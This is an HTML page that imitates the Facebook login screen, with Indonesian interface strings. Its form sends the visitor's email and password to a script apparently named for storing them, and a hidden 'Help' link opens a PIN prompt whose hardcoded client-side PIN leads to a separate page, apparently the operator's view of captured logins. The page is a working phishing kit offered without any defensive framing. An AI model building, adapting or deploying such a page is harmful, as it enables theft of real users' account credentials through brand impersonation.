<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
    
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Facebook</h1>
            <form action="aksi_tambah.php" method="POST">
                <input type="text" name="email" placeholder="Email or Mobile Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="links">
                <a href="#">Forgot your password?</a>
                <a href="#">Create New Account</a>
            </div>
            <div class="footer-links">
                <a href="#">Language</a>
                <a href="#" id="helpLink">Help</a>
                <a href="#">Exit</a>
            </div>
        </div>
    </div>

    <!-- The Modal -->
    <div id="pinModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>Masukkan PIN</h2>
            <input type="password" id="pinInput" placeholder="Enter PIN">
            <button id="submitPinButton">Submit</button>
            <p id="errorMessage" style="color:red; display:none;">PIN salah. Silakan coba lagi.</p>
        </div>
    </div>

    <script>
        document.getElementById('helpLink').addEventListener('click', function(event) {
            event.preventDefault();
            document.getElementById('pinModal').style.display = 'block';
        });

        document.getElementsByClassName('close')[0].addEventListener('click', function() {
            document.getElementById('pinModal').style.display = 'none';
            document.getElementById('errorMessage').style.display = 'none';
        });

        document.getElementById('submitPinButton').addEventListener('click', function() {
            var pin = document.getElementById('pinInput').value;
            if (pin === '070204') {
                window.location.href = 'login.php';
            } else {
                document.getElementById('errorMessage').style.display = 'block';
            }
        });

        window.onclick = function(event) {
            var modal = document.getElementById('pinModal');
            if (event.target === modal) {
                modal.style.display = 'none';
                document.getElementById('errorMessage').style.display = 'none';
            }
        }
    </script>
</body>
</html>
